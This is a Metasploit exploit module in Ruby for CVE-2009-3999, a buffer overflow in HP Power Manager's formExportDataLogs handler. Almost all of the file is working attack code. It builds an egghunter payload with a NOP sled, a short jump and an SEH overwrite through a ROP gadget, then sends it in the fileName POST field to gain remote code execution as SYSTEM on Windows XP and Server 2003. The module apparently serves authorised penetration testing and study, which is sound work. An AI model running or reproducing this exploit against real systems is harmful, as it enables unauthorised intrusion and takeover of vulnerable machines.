##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::Egghunter

  def initialize(info = {})
    super(update_info(info,
      'Name'            => "HP Power Manager 'formExportDataLogs' Buffer Overflow",
      'Description'     => %q{
          This module exploits a buffer overflow in HP Power Manager's 'formExportDataLogs'.
        By creating a malformed request specifically for the fileName parameter, a stack-based
        buffer overflow occurs due to a long error message (which contains the fileName),
        which may result in arbitrary remote code execution under the context of 'SYSTEM'.
      },
      'License'         => MSF_LICENSE,
      'Author'          =>
        [
          # Original discovery (Secunia Research)
          'Alin Rad Pop',
          # Metasploit module (thx DcLabs members, corelanc0d3r, humble-desser, Jason Kratzer)
          'Rodrigo Escobar <ipax[at]dclabs.com.br>',
          # Metasploit fu
          'sinn3r'
        ],
      'References'      =>
        [
          [ 'CVE', '2009-3999' ],
          [ 'OSVDB', '61848'],
          [ 'BID', '37867' ]
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
        },
      'Platform'        => 'win',
      'Payload'         =>
        {
          # NOTE: Bad characters
          'BadChars' => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c&=+?:;-,/#.\\$%\x1a",
          'DisableNops' => true,
          # NOTE: jmp EDI instruction, implying that the executable buffer landed in EDI
          'EncoderOptions' => {'BufferRegister' => 'EDI' }  # Egghunter jmp edi
        },
      'Targets'         =>
        [
          [
            # Tested on HP Power Manager 4.2 (Build 7 and 9)
            'Windows XP SP3 / Win Server 2003 SP0',
            {
              # NOTE: A ROP gadget
              'Ret'    => 0x004174d5,  #pop esi # pop ebx # ret 10 (DevManBE.exe)
              'Offset' => 721
            }
          ]
        ],
      'Privileged'      => false,
      'DisclosureDate'  => 'Oct 19 2011',
      'DefaultTarget'   => 0))
  end

  def exploit
    print_status("Generating payload...")

    # Randomize the tag by not specifying one
    eggoptions = { :checksum => true }

    hunter,egg = generate_egghunter(payload.encoded, payload_badchars, eggoptions)

    buffer  = rand_text_alpha_upper(target['Offset'] - hunter.length)
    # add a 30 \x90 NOP sled before the hunter
    # The "egg" stands for executable shellcode
    buffer << make_nops(30) + hunter
    buffer << "\xeb\xc2\x90\x90"           #JMP SHORT 0xC2
    buffer << [target.ret].pack('V*')[0,3] #SEH (strip the null byte, HP PM will pad it for us)

    # Let's make the request a little bit more realistic looking
    time = Time.new

    print_status("Trying target #{target.name}...")
    connect

    request = send_request_cgi({
      'method'    => 'POST',
      'uri'       => '/goform/formExportDataLogs',
      'vars_post' => {
        'dataFormat' => 'comma',
        'exportto'   => 'file',
        # payload
        'fileName'   => buffer,
        'bMonth'     => "%02d" %time.month,
        'bDay'       => "%02d" %time.day,
        'bYear'      => time.year.to_s,
        'eMonth'     => "%02d" %time.month,
        'eDay'       => "%02d" %time.day,
        'eYear'      => time.year.to_s,
        'LogType'    => 'Application',
        'actionType' => '1%3B'
      },
      'headers' =>
        {
          'Accept'  => egg,
          'Referer' => "http://#{rhost}/Contents/exportLogs.asp?logType=Application"
        }
    }, 5)

    print_status("Payload sent! Go grab a coffee, the CPU is gonna work hard for you! :)")

    # Wait for a bit longer. For some reason it may take some time for the process to start
    # handling our request.
    select(nil, nil, nil, 7)

    handler
    disconnect
  end
end
